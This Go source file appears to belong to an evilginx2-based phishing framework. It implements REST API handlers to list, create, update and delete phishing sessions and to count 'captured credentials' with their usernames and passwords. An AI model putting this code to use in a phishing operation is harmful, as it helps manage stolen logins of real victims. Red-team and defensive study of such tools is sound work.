package api

import (
	"net/http"
	"strconv"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/kgretzky/evilginx2/internal/storage"
	"github.com/kgretzky/evilginx2/pkg/models"
)

func (s *Server) listSessions(c *gin.Context) {
	filters := &storage.SessionFilters{}
	
	if phishlet := c.Query("phishlet"); phishlet != "" {
		filters.PhishletName = phishlet
	}
	
	if username := c.Query("username"); username != "" {
		filters.Username = username
	}
	
	if startTime := c.Query("start_time"); startTime != "" {
		if t, err := time.Parse(time.RFC3339, startTime); err == nil {
			filters.StartTime = &t
		}
	}
	
	if endTime := c.Query("end_time"); endTime != "" {
		if t, err := time.Parse(time.RFC3339, endTime); err == nil {
			filters.EndTime = &t
		}
	}
	
	if limit := c.Query("limit"); limit != "" {
		if l, err := strconv.Atoi(limit); err == nil {
			filters.Limit = l
		}
	}
	
	if offset := c.Query("offset"); offset != "" {
		if o, err := strconv.Atoi(offset); err == nil {
			filters.Offset = o
		}
	}
	
	sessions, err := s.storage.ListSessions(c.Request.Context(), filters)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	
	c.JSON(http.StatusOK, gin.H{
		"sessions": sessions,
		"count":    len(sessions),
	})
}

func (s *Server) createSession(c *gin.Context) {
	var session models.Session
	if err := c.ShouldBindJSON(&session); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	
	if session.ID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "session ID is required"})
		return
	}
	
	if session.PhishletName == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "phishlet name is required"})
		return
	}
	
	if err := s.storage.CreateSession(c.Request.Context(), &session); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	
	c.JSON(http.StatusCreated, session)
}

func (s *Server) getSession(c *gin.Context) {
	id := c.Param("id")
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "session ID is required"})
		return
	}
	
	session, err := s.storage.GetSession(c.Request.Context(), id)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "session not found"})
		return
	}
	
	c.JSON(http.StatusOK, session)
}

func (s *Server) updateSession(c *gin.Context) {
	id := c.Param("id")
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "session ID is required"})
		return
	}
	
	var session models.Session
	if err := c.ShouldBindJSON(&session); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	
	session.ID = id
	
	if err := s.storage.UpdateSession(c.Request.Context(), &session); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	
	c.JSON(http.StatusOK, session)
}

func (s *Server) deleteSession(c *gin.Context) {
	id := c.Param("id")
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "session ID is required"})
		return
	}
	
	if err := s.storage.DeleteSession(c.Request.Context(), id); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	
	c.JSON(http.StatusOK, gin.H{"message": "session deleted successfully"})
}

func (s *Server) getSessionStats(c *gin.Context) {
	sessions, err := s.storage.ListSessions(c.Request.Context(), nil)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	
	activeSessions := 0
	capturedCreds := 0
	phishletMap := make(map[string]bool)
	
	for _, session := range sessions {
		if session.IsActive {
			activeSessions++
		}
		if session.Username != "" && session.Password != "" {
			capturedCreds++
		}
		phishletMap[session.PhishletName] = true
	}
	
	stats := models.SessionStats{
		TotalSessions:   len(sessions),
		ActiveSessions:  activeSessions,
		CapturedCreds:   capturedCreds,
		UniquePhishlets: len(phishletMap),
	}
	
	c.JSON(http.StatusOK, stats)
}
